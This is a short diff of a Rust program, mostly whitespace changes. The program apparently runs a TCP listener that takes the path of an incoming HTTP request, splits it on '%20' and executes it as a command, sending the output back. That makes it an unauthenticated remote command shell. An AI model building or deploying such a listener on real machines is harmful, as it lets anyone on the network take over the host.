@@ -18,13 +18,16 @@ impl Con {
             stream: String::new(),
         })
     }
+
     fn start(&mut self) -> io::Result<()> {
         let mut buffer = [0; 512];
         for stream in self.listener.incoming() {
-            self.stream.clear();
             let mut s = stream?;
+
             if let Ok(_n) = s.read(&mut buffer) {};
+
             self.stream = String::from_utf8_lossy(&buffer).to_string();
+
             if let Some(cmd) = self.get_cmd() {
                 match self.exec_cmd(s, cmd) {
                     Ok(_) => {}
@@ -40,9 +43,11 @@ impl Con {
             Some(idx) => idx - 1,
             None => return None,
         };
+
         let unescaped = &self.stream[5..http_idx];
         Some(unescaped.split("%20"))
     }
+
     fn exec_cmd(&self, s: TcpStream, cmd: std::str::Split<&str>) -> io::Result<()> {
         let cmd = cmd.collect::<Vec<&str>>().join(" ");
 
@@ -53,6 +58,7 @@ impl Con {
 
         Ok(())
     }
+
     fn return_out(mut stream: TcpStream, out: &str) {
         let mut content = String::new();
 
